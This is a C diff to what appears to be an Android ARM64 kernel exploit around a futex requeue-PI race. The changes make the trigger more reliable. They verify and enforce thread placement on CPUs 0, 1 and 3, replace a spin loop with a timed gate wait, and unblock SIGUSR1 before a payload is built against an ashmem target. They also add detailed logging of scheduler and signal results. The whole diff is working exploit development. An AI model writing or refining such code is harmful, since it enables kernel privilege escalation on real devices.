@@ -112,6 +112,12 @@ V14_OFFSET_ASSERT(secondary_1, TARGET_FUTEX_V14_SECONDARY_1_OFF);
 static struct v14_state_page g_v14_state __attribute__((aligned(4096)));
 static uint64_t g_v14_delay_cycles;
 static atomic_int g_v14_followup_epoch;
+static atomic_int g_v14_gate_seen;
+static atomic_int g_v14_sig_ok;
+static atomic_int g_v14_sched_ret;
+static atomic_int g_v14_sched_errno;
+static atomic_int g_v14_waiter_cpu;
+static atomic_int g_v14_consumer_cpu;
 
 static uint64_t read_cntvct(void) {
   uint64_t val;
@@ -127,6 +133,72 @@ static void spin_wait_cycles(uint64_t cycles) {
   while (read_cntvct() - start < cycles) {
     __asm__ volatile("yield" ::: "memory");
   }
+}
+
+static int wait_for_atomic_deadline(atomic_int *value, int expected,
+                                    uint64_t timeout_ms) {
+  uint64_t deadline = futex_now_ms() + timeout_ms;
+  while (atomic_load(value) != expected) {
+    if (futex_now_ms() >= deadline) return 0;
+    sched_yield();
+  }
+  return 1;
+}
+
+/* Informational only. Android may deny shell access to cpuN/online even when
+ * the CPU is online and sched_setaffinity() can place this process there. */
+static int cpu_online_hint(int cpu) {
+  char path[64];
+  snprintf(path, sizeof(path), "/sys/devices/system/cpu/cpu%d/online", cpu);
+  FILE *fp = fopen(path, "re");
+  if (!fp) return -1;
+  int online = 0;
+  int readable = fscanf(fp, "%d", &online) == 1;
+  fclose(fp);
+  return readable ? (online == 1) : -1;
+}
+
+static int verify_v14_cpu_contract(void) {
+  static const int cpus[] = {0, 1, 3};
+  cpu_set_t original;
+  if (sched_getaffinity(0, sizeof(original), &original) != 0) {
+    fprintf(stderr, "[futex-v14] CPU contract affinity-read failed errno=%d\n",
+            errno);
+    return 0;
+  }
+  int ok = 1;
+  for (size_t i = 0; i < sizeof(cpus) / sizeof(cpus[0]); i++) {
+    cpu_set_t probe;
+    CPU_ZERO(&probe);
+    CPU_SET(cpus[i], &probe);
+    errno = 0;
+    int affinity_ok = sched_setaffinity(0, sizeof(probe), &probe) == 0;
+    int affinity_errno = errno;
+    int actual_cpu = affinity_ok ? sched_getcpu() : -1;
+    int online_hint = cpu_online_hint(cpus[i]);
+    fprintf(stderr,
+            "[futex-v14] CPU probe cpu=%d online_hint=%d affinity_ok=%d "
+            "actual=%d errno=%d\n",
+            cpus[i], online_hint, affinity_ok, actual_cpu, affinity_errno);
+    if (!affinity_ok || actual_cpu != cpus[i]) {
+      fprintf(stderr,
+              "[futex-v14] CPU contract failed cpu=%d actual=%d errno=%d\n",
+              cpus[i], actual_cpu, affinity_errno);
+      ok = 0;
+      break;
+    }
+  }
+  int restore_errno = 0;
+  if (sched_setaffinity(0, sizeof(original), &original) != 0) {
+    restore_errno = errno;
+    ok = 0;
+  }
+  if (!ok && restore_errno != 0) {
+    fprintf(stderr,
+            "[futex-v14] CPU contract affinity-restore failed errno=%d\n",
+            restore_errno);
+  }
+  return ok;
 }
 
 static uint64_t supervisor_attempt_delay_cycles(void) {
@@ -2373,6 +2445,7 @@ static void *consumer_thread_fn_v14(void *arg) {
     atomic_store(&g_v14_state.route_done, 1);
     return NULL;
   }
+  atomic_store(&g_v14_consumer_cpu, sched_getcpu());
 
   int previous_state = 0;
   while (!atomic_load(&g_v14_state.stop)) {
@@ -2425,6 +2498,9 @@ static void *consumer_thread_fn_v14(void *arg) {
     errno = 0;
     int nice_value = 19 - ((state - 1) % 8);
     long ret = sched_setattr_tid_v4(tid, nice_value);
+    int sched_errno = errno;
+    atomic_store(&g_v14_sched_ret, (int)ret);
+    atomic_store(&g_v14_sched_errno, sched_errno);
     if (state == 1 && g_sched_mutation_state != NULL) {
       __atomic_store_n(g_sched_mutation_state, g_sched_mutated_state,
                        __ATOMIC_RELEASE);
@@ -2497,8 +2573,21 @@ static void *waiter_thread_fn_v14(void *arg) {
     atomic_store(&g_v14_state.route_done, 1);
     return NULL;
   }
+  atomic_store(&g_v14_waiter_cpu, sched_getcpu());
   int tid = (int)syscall(SYS_gettid);
   atomic_store(&g_v14_state.waiter_tid, tid);
+
+  sigset_t unblock_set;
+  sigemptyset(&unblock_set);
+  sigaddset(&unblock_set, SIGUSR1);
+  int unblock_error = pthread_sigmask(SIG_UNBLOCK, &unblock_set, NULL);
+  if (unblock_error != 0) {
+    fprintf(stderr, "[futex-v14] SIGUSR1 unblock failed error=%d\n",
+            unblock_error);
+    atomic_store(&g_v14_state.stop, 1);
+    atomic_store(&g_v14_state.route_done, 1);
+    return NULL;
+  }
 
   if (!sigusr1_install_handler()) {
     atomic_store(&g_v14_state.stop, 1);
@@ -2543,19 +2632,15 @@ static void *waiter_thread_fn_v14(void *arg) {
   atomic_store(&g_v14_state.stop, 0);
   atomic_store(&g_v14_state.state, -1);
 
-  for (uint64_t spins = 0;
-       spins <= TARGET_FUTEX_SHORT_SPIN_MAX &&
-       !atomic_load(&g_v14_state.gate);
-       spins++) {
-    __asm__ volatile("yield" ::: "memory");
-  }
-
-  int gate_seen = atomic_load(&g_v14_state.gate);
+  int gate_seen = wait_for_atomic_deadline(
+      &g_v14_state.gate, 1, TARGET_FUTEX_GATE_TIMEOUT_MS);
+  atomic_store(&g_v14_gate_seen, gate_seen);
   int sig_ok = 0;
   if (gate_seen && atomic_load(&g_use_sigusr1)) {
     sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
     sig_ok = sigusr1_fire_and_wait();
   }
+  atomic_store(&g_v14_sig_ok, sig_ok);
 
   if (sig_ok) {
     uint64_t spin_epoch;
@@ -2648,6 +2733,14 @@ int run_futex_trigger_v14_cb(futex_post_trigger_cb post_trigger_cb,
   atomic_store(&g_cb_result, 0);
   g_post_cb = post_trigger_cb;
   g_post_cb_ctx = ctx;
+  atomic_store(&g_v14_gate_seen, 0);
+  atomic_store(&g_v14_sig_ok, 0);
+  atomic_store(&g_v14_sched_ret, -2);
+  atomic_store(&g_v14_sched_errno, 0);
+  atomic_store(&g_v14_waiter_cpu, -1);
+  atomic_store(&g_v14_consumer_cpu, -1);
+
+  if (!verify_v14_cpu_contract()) return 0;
 
   if (!pin_to_cpu(0)) {
     fprintf(stderr, "[futex-v14] CPU-0 affinity failed errno=%d\n", errno);
@@ -2691,6 +2784,17 @@ int run_futex_trigger_v14_cb(futex_post_trigger_cb post_trigger_cb,
   }
   futex_v14_dbg("threads-ready");
 
+  int main_cpu = sched_getcpu();
+  int waiter_cpu = atomic_load(&g_v14_waiter_cpu);
+  int consumer_cpu = atomic_load(&g_v14_consumer_cpu);
+  if (main_cpu != 0 || waiter_cpu != 3 || consumer_cpu != 1) {
+    fprintf(stderr,
+            "[futex-v14] CPU placement failed main=%d waiter=%d consumer=%d\n",
+            main_cpu, waiter_cpu, consumer_cpu);
+    atomic_store(&g_v14_state.stop, 1);
+    return 0;
+  }
+
   usleep(TARGET_FUTEX_PAUSE_USEC);
   futex_v14_dbg("post-100ms-pause");
 
@@ -2710,6 +2814,20 @@ int run_futex_trigger_v14_cb(futex_post_trigger_cb post_trigger_cb,
 
   fprintf(stderr, "[futex-v14] cmp_requeue_pi ret=%ld errno=%d\n",
           requeue_ret, requeue_errno);
+  fprintf(stderr,
+          "[futex-v14] summary gate_seen=%d sig_ok=%d sched_done=%d "
+          "attempt_count=%d success_count=%d cmp_ret=%ld cmp_errno=%d "
+          "sched_ret=%d sched_errno=%d handler_result=%d "
+          "handler_reason=%s cpu=%d/%d/%d\n",
+          atomic_load(&g_v14_gate_seen), atomic_load(&g_v14_sig_ok),
+          atomic_load(&g_v14_state.sched_done),
+          atomic_load(&g_v14_state.attempt_count),
+          atomic_load(&g_v14_state.success_count), requeue_ret, requeue_errno,
+          atomic_load(&g_v14_sched_ret), atomic_load(&g_v14_sched_errno),
+          sigusr1_last_handler_result(),
+          sigusr1_handler_reason_name(sigusr1_last_handler_reason()),
+          main_cpu, atomic_load(&g_v14_consumer_cpu),
+          atomic_load(&g_v14_waiter_cpu));
 
   if (!atomic_load(&waiter_ok)) {
     fprintf(stderr, "[futex-v14] waiter route not ok\n");
